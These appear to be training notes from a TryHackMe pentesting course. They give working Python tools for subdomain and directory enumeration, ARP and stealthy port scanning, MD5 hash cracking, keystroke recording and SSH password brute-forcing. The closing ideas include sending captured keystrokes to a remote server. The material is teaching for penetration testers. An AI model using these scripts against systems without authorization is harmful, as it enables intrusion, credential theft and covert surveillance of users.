## Subdomain Enumeration


```
import requests 
import sys 

sub_list = open("subdomains.txt").read() 
subdoms = sub_list.splitlines()

for sub in subdoms:
    sub_domains = f"http://{sub}.{sys.argv[1]}" 

    try:
        requests.get(sub_domains)
    
    except requests.ConnectionError: 
        pass
    
    else:
        print("Valid domain: ",sub_domains)   

```

---

## Directory Enumeration


```

import requests 
import sys 

sub_list = open("wordlist.txt").read() 
directories = sub_list.splitlines()

for dir in directories:
    dir_enum = f"http://{sys.argv[1]}/{dir}.html" 
    r = requests.get(dir_enum)
    if r.status_code==404: 
        pass
    else:
        print("Valid directory:" ,dir_enum)

```

## Network Scanner


Python can be used to build a simple ICMP (Internet Control Message Protocol) scanner to identify potential targets on the network. However, ICMP packets can be monitored or blocked as the target organization would not expect a regular user to “ping a server”. On the other hand, systems can be configured to not respond to ICMP requests. These are the main reasons why using the ARP (Address Resolution Protocol) to identify targets on the local network is more effective. 

```
from scapy.all import *

interface = "eth0"
ip_range = "10.10.X.X/24"
broadcastMac = "ff:ff:ff:ff:ff:ff"

packet = Ether(dst=broadcastMac)/ARP(pdst = ip_range) 

ans, unans = srp(packet, timeout =2, iface=interface, inter=0.1)

for send,receive in ans:
        print (receive.sprintf(r"%Ether.src% - %ARP.psrc%"))  
```

## Port Scanner


```
import sys
import socket
import pyfiglet


ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \nPort Scanner")
print(ascii_banner)


ip = '192.168.1.6' 
open_ports =[] 

ports = range(1, 65535)


def probe_port(ip, port, result = 1): 
  try: 
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.settimeout(0.5) 
    r = sock.connect_ex((ip, port))   
    if r == 0: 
      result = r 
    sock.close() 
  except Exception as e: 
    pass 
  return result


for port in ports: 
    sys.stdout.flush() 
    response = probe_port(ip, port) 
    if response == 0: 
        open_ports.append(port) 
    

if open_ports: 
  print ("Open Ports are: ") 
  print (sorted(open_ports)) 
else: 
  print ("Looks like no ports are open :(")

```

To better understand the port scanning process, we can break down the code into several sections: 

Importing modules that will help the code run:

`import sys`

`import socket`

Modules could also be imported with a single line using

`import socket,sys`


Specifying the target:

`ip = '192.168.1.6' `


An empty “open_ports” array that will be populated later with the detected open ports:

`open_ports =[] `


Ports that will be probed:


`ports = range(1, 65535)`

For this example, we have chosen to scan all TCP ports using the range() function. However, if you are looking for a specific service or want to save time by scanning a few common ports, the code could be changed as follows;

`ports = { 21, 22, 23, 53, 80, 135, 443, 445}`

The list above is relatively small. As we are trying to keep a rather low profile, we have limited the list to ports that will likely be used by systems connected to a corporate network.

Getting the IP address of the domain name given as target. The code also works if the user directly provides the IP address.

`ip = socket.gethostbyname(host)`


Tries to connect to the port:

This code is followed by a for loop that iterates through the specified port list:

## File Downloader


`Wget` on Linux systems or `Certutil` on Windows are useful tools to download files.

Python can also be used for the same purpose.

The code:

```
import requests

url = 'https://assets.tryhackme.com/img/THMlogo.png'
r = requests.get(url, allow_redirects=True)
open('THMlogo.png', 'wb').write(r.content)
```

This short piece of code can easily be adapted to retrieve any other type of file, as seen below:

``` 
import requests

url = 'https://download.sysinternals.com/files/PSTools.zip'
r = requests.get(url, allow_redirects=True)
open('PSTools.zip', 'wb').write(r.content)  
```
PSexec allow system administrators to run commands on remote Windows systems. We see that PSexec is also used in cyber attacks as it is usually not detected by antivirus software. You can learn more about PSexec [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) and read [this](https://www.praetorian.com/blog/threat-hunting-how-to-detect-psexec/) blogpost about its use by attackers.

## Hash Cracker


```
import hashlib
import pyfiglet

ascii_banner = pyfiglet.figlet_format("TryHackMe \n Python 4 Pentesters \n HASH CRACKER for MD 5")
print(ascii_banner)

wordlist_location = str(input('Enter wordlist file location: '))
hash_input = str(input('Enter hash to be cracked: '))

with open(wordlist_location, 'r') as file:
    for line in file.readlines():
        hash_ob = hashlib.md5(line.strip().encode())
        hashed_pass = hash_ob.hexdigest()
        if hashed_pass == hash_input:
            print('Found cleartext password! ' + line.strip())
            exit(0)

```

This script will require two inputs: the location of the wordlist and the hash value.

As you probably know, hash values can not be cracked as they do not contain the cleartext value. Unlike encrypted values that can be "reversed" (e.g. decrypted), cleartext values for hashes can only be found starting with a list of potential cleartext values. A simplified process can be seen below;

   1. You retrieve the hash value "eccbc87e4b5ce2fe28308fd9f2a7baf3" from a database, which you suspect is the hash for 1.a number between 1 and 5.
   2. You create a file with possible cleartext values (numbers from 1 to 5)
   3. You generate a list of hashes for values in the cleartext list (Hash values for numbers between 1 and 5)
   4. You compare the generated hash with the hash value at hand (Matches hash value of the number 3)

Obviously, a more effective process can be designed, but the main principle will remain identical.

The script below follows an approach close to the one described above;

   1. Asks for the location of a wordlist
   2. Asks for the hash to be cracked
   3. Reads values from the wordlist (one per line)
   4. Converts cleartext values to MD5 hash values
   5. Compares the generated MD5 hash value with the value entered by the user

## Keyloggers


A good example is the “keyboard” module, which allows us to interact with the keyboard.

If the “keyboard” module is not available on your system, we can use pip3 to install it.
pip3 install keyboard   

Using the keyboard module, the following three lines of code would be enough to record and replay keys pressed:

```
import keyboard
keys = keyboard.record(until ='ENTER')
keyboard.play(keys)
```

“keyboard.record” will record the keys until ENTER is pressed, and “keyboard.play” will replay them. As this script is logging keystrokes, any edit using backspace will also be seen.

## SSH Brute Forcing


The powerful Python language is supported by a number of modules that easily extend its capabilities. Paramiko is an SSHv2 implementation that will be useful in building SSH clients and servers.

The example below shows one way to build an SSH password brute force attack script. As is often the case in programming, there rarely is a single correct answer for these kinds of applications. As a penetration tester, your usage of programming languages will be different for developers. While they may care about best practices and code hygiene, your goal will more often be to end with a code that works as you want it to.

By now, you should be familiar with the "try" and "except" syntax. This script has one new feature, "def". "Def" allows us to create custom functions, as seen below.  The "ssh_connect" function is not native to Python but built using Paramiko and the "paramiko.SSHClient()" function.

```
import paramiko
import sys
import os

target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        
        try:
            response = ssh_connect(password)

            if response == 0:
                 print('password found: '+ password)
                 exit(0)
            elif response == 1: 
                print('no luck')
        except Exception as e:
            print(e)
        pass

input_file.close()
```

Imports: We import modules we will use inside the script. As discussed earlier, we will need Paramiko to interact with the SSH server on the target system. "Sys" and "os" will provide us with the basic functionalities needed to read a file from the operating system (our password list in this case). As we are using Paramiko to communicate with the SSH server, we do not need to import "socket".

Inputs: This block will request input from the user. An alternative way to do this would be to accept the user input directly from the command line as an argument using "sys.argv[]".

![](https://i.imgur.com/qFQLbW6.png)

SSH Connection: This section will create the "ssh_connect" function. Successful authentication will return a code 0, a failed authentication will return a code 1.

![](https://i.imgur.com/TyBgljF.png)

Password list: We then open the password file supplied earlier by the user and take each line as a password to be tried. 

![](https://i.imgur.com/lTJu912.png)

Responses: The script tries to connect to the SSH server and decides on an output based on the response code. Please note the response code here is the one generated by Paramiko and not an HTTP response code. The script exits once it has found a valid password.

As you will see, the scripts run slower than we would expect. To improve speed, you may want to look into threading this process.

## Conclusions


ToDo:

Based on what we have covered in this room, here are a few suggestions about how you could expand these tools or start building your own using Python:

   - Use DNS requests to enumerate potential subdomains
   - Build the keylogger to send the capture keystrokes to a server you built using Python
   - Grab the banner of services running on open ports
   - Crawl the target website to download .js library files included
   - Try to build a Windows executable for each and see if they work as stand-alone applications on a Windows target
   - Implement threading in enumeration and brute-forcing scripts to make them run faster
